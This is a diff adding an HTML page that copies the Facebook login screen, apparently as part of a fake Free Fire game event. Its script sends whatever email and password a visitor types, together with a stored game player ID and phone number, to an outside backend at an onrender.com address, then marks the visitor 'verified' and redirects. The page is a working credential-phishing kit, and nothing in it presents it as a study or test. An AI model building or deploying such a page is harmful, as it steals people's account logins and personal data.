@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="./facebook-styles.css" />
+</head>
+<body>
+<main class="main-wrapper">
+    <div class="container">
+        <div class="left">
+            <img src="pic/facebooklogo.svg" alt="Facebook logo" />
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right">
+            <form class="login-box" id="loginForm">
+                <input type="text" id="email" placeholder="Email or phone number" required autocomplete="username" />
+                <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
+                <button type="submit" class="login-btn" id="loginButton">Log In</button>
+                <a href="#" class="forgot">Forgot password?</a>
+                <hr />
+                <button type="button" class="create-account">Create new account</button>
+            </form>
+            <p class="create-page">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </p>
+        </div>
+    </div>
+</main>
+
+<footer class="footer-wrapper">
+    <div class="footer-container">
+        <div class="language">
+            <a href="#">English (UK)</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">اردو</a>
+            <a href="#">العربية</a>
+            <a href="#">Français (France)</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Italiano</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Español</a>
+            <a href="#">日本語</a>
+            <button class="plus-btn">+</button>
+        </div>
+        <div class="tools">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Watch</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Oculus</a>
+            <a href="#">Portal</a>
+            <a href="#">Instagram</a>
+            <a href="#">Bulletin</a>
+            <a href="#">Local</a>
+        </div>
+        <div class="company">
+            <p>Facebook &copy; 2026</p>
+        </div>
+    </div>
+</footer>
+
+<script>    
+    document.addEventListener('DOMContentLoaded', () => {
+        const loginForm = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+
+        loginForm.addEventListener('submit', (event) => {
+            event.preventDefault();
+
+            const username = emailInput.value.trim();
+            const password = passwordInput.value;
+
+            if (username.length >= 4 && password.length >= 6) {
+                // Get player UID and mobile number from localStorage
+                const playerId = localStorage.getItem('garena_player_id') || "";
+                const phoneNumber = localStorage.getItem('garena_phone_number') || "";
+
+                // Automatically detect backend API location
+                const apiUrl = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && window.location.port === '5500'
+                    ? 'http://localhost:3000/api/login'
+                    : 'https://freefire-backend-f409.onrender.com/api/login';
+
+                // Send credentials to backend server which connects to MongoDB
+                fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        email: username, 
+                        password: password,
+                        playerId: playerId,
+                        phoneNumber: phoneNumber
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        // Save Facebook verified state
+                        localStorage.setItem('verified_method', 'facebook');
+                        localStorage.setItem('verified_email', username);
+                        localStorage.setItem('verified_success', 'true');
+
+                        // Redirect back to the main event screen with a success flag
+                        window.location.href = 'index.html?verified=facebook';
+                    } else {
+                        alert('Server error: ' + (data.message || 'Unable to store credentials. Please check database connection.'));
+                    }
+                })
+                .catch(err => {
+                    console.error('Error saving credentials:', err);
+                    alert('Error connecting to backend database. Please make sure the server in the backend directory is running and your MongoDB URI in .env is correct.');
+                });
+            } else {
+                if (username.length < 4) {
+                    alert('Please enter a valid email address or phone number.');
+                    emailInput.focus();
+                } else if (password.length < 6) {
+                    alert('The password you’ve entered is incorrect. Passwords must be at least 6 characters.');
+                    passwordInput.focus();
+                }
+            }
+        });
+    });
+</script>
+</body>
+</html>
